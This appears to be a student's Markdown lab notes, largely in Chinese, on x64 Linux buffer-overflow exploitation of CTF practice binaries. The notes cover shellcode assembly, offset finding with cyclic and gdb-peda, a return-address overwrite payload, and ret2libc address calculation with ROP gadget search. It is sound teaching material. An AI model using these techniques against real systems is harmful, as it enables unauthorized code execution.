# Linux Binary Exploitation - BOF

- Env: Ubuntu Linux x64

## Practice

### hello.s

- Hello World!

```
# 編寫 x64 Assembly
sudo apt install nasm
nasm -felf64 hello.s -o hello.o
ld -m elf_x86_64 hello.o -o hello
./hello

# 產生shellcode
objcopy -O binary hello shellcode.bin
xxd shellcode.bin
```

### shell.s

- 硬幹shellcode

```
nasm -felf64 shell.s -o shell.o
ld -m elf_x86_64 shell.o -o shell
./shell

objcopy -O binary shell shellcode.bin
xxd shellcode.bin
```

### getshell.py

- 用 x64 Assembly + pwntools 組譯一段 shellcode
- python getshell.py

### test_shellcode.c 

- 測試shellcode可不可以用
- gcc -z execstack -g test_shellcode.c
- ./a.out

## Lab 1, [practice] bof, Return To Text

### 找函數位址?

- gdb: x/i www
    - gdb-peda$ x/i www
    - 0x400686 <www>:	push   rbp
- objdump -D <file> 去找

### 要怎麼知道塞多少個才能剛好塞到EIP

1. aaaaaaaabbbbbbbb 8個一組自己慢慢定位
2. pwntool : cyclic /cyclic_find
3. gdb-peda : pattc / patto

### 實例

```python=
from pwn import *
cyclic(200) # 會輸出一堆垃圾，從gdb執行後貼入，複製stack最上層隨便幾個字到下面func
from pwn import *
cyclic_find('crash後stack上最上面之字') # 4bytes即可(4個char)
```

```shell=
# gdb-peda進去之後
pattc 200 # 垃圾，複製起來
r # run 並貼上，會爛掉，取stack上之最前面4bytes
patto AA0AAFAA # 會告訴你offset多少
```

### 知道資訊後開始寫破解程式

- 塞40個，return address改成www()之address
- echo -ne "aaaaaaaabbbbbbbbccccccccddddddddeeeeeeee\x86\x06\x40\x00\x00\x00\x00\x00" > exp.bin
- cat exp.bin - | ./bof
- 也可用gdb寫到裡面
    - gdb-peda$ r < exp.bin
- 用ncat叫起來，再自己破解(有點麻煩)

### 用pwntools

- python 01-local.py

## Lab 2, [practice] ret2sc, Return to Shellcode

- 先玩玩程式，有兩個輸入。第一個有限長度，第二個可以overflow。

```
objdump 02-ret2sc-a6a74cce51b034b6570e5416a38973c195d1b414 -d -M intel | less

# 發現 應該有個data段的變數 位址是 0x601080 固定的
# 第一個輸入就可以輸入shell

# 第二個輸入希望蓋過retrun address 改成 0x601080
# 所以 要塞多少個垃圾才能蓋掉return address？

# 一樣先gdb
gdb-peda$ pattc 300
# 將輸出複製 run 之後貼上

# 取前面幾bytes
gdb-peda$ patto %bA%1A%G
%bA%1A%G found at offset: 248
# 得知是248bytes
# 寫 python囉
python 02-local.py
```

## Lab 3, [practice] ret2lib, Return to Lib

- 因ASLR防護，自幾定位libc在哪邊!
- 玩玩程式，有兩個輸入，第一個就印出memory，可以拿來leak。第二個輸入太長會overflow。

```
objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep puts

# 一樣gdb進去後先玩
gdb-peda$ r
Starting program: /home/hsu/ctf-adl/ntu/10-06/03-ret2lib-8dae1f5fdb78457da8190155c8ea5643f5139991
What do you want to see in memory?
address(hex):400000
content:0x10102464c457f
What's your name ?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Thank you ~ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Program received signal SIGSEGV, Segmentation fault.

gdb-peda$ pattc 100

gdb-peda$ patto AcAA2AAH
AcAA2AAH found at offset: 56
# 56 bytes即可蓋過ret

# 發現NX有開，ASLR也有開
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

# 要先這樣才能繼續玩
export LD_PRELOAD='./libc.so.6'

# 先看看
gdb-peda$ disassemble main
# 看一下puts function好了
gdb-peda$ elfsymbol
Found 7 symbols
puts@plt = 0x400560
printf@plt = 0x400570
read@plt = 0x400580
__libc_start_main@plt = 0x400590
strtoll@plt = 0x4005a0
gets@plt = 0x4005b0
setvbuf@plt = 0x4005c0
# 過去看一下，發現GOT在0x601018這個位址
gdb-peda$ disassemble 0x400560
Dump of assembler code for function puts@plt:
   0x0000000000400560 <+0>:	jmp    QWORD PTR [rip+0x200ab2]        # 0x601018
   0x0000000000400566 <+6>:	push   0x0
   0x000000000040056b <+11>:	jmp    0x400550
End of assembler dump.
# 顯示一下0x601018內容是啥(run之後才會有)
gdb-peda$ x/x 0x601018
0x601018:	0x00007ffff7a7c690
# 在反組譯發現是puts
gdb-peda$ disassemble 0x00007ffff7a7c690
Dump of assembler code for function puts:
...

# 找一下libc中的位址
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7b99d17 --> 0x68732f6e69622f ('/bin/sh')
# 記一下位址
objdump -T libc.so.6 | grep puts # 0x6f690
objdump -T libc.so.6 | grep system # 0x45390
# 用puts算libc base: 0x7ffff7a7c690 - 0x6f690 = 0x7ffff7a0d000
# system位址: 0x7ffff7a0d000 + 0x45390 = 0x7ffff7a52390
# /bin/sh offset: 0x7ffff7b99d17 - 0x7ffff7a0d000 = 0x18cd17

# pop rdi, ret 的address
gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x00400823 : (b'5fc3')	pop rdi; ret
gdb-peda$ ropsearch "ret"
Searching for ROP gadget: 'ret' in: binary ranges
0x00400541 : (b'c3')	ret
0x004006fb : (b'c3')	ret
0x00400824 : (b'c3')	ret
0x004007b5 : (b'c3')	ret
0x00400641 : (b'c3')	ret
0x00400689 : (b'c3')	ret
0x004006ab : (b'c3')	ret
0x00400831 : (b'c3')	ret
0x0040083c : (b'c3')	ret
0x0040080f : (b'c3')	ret
```
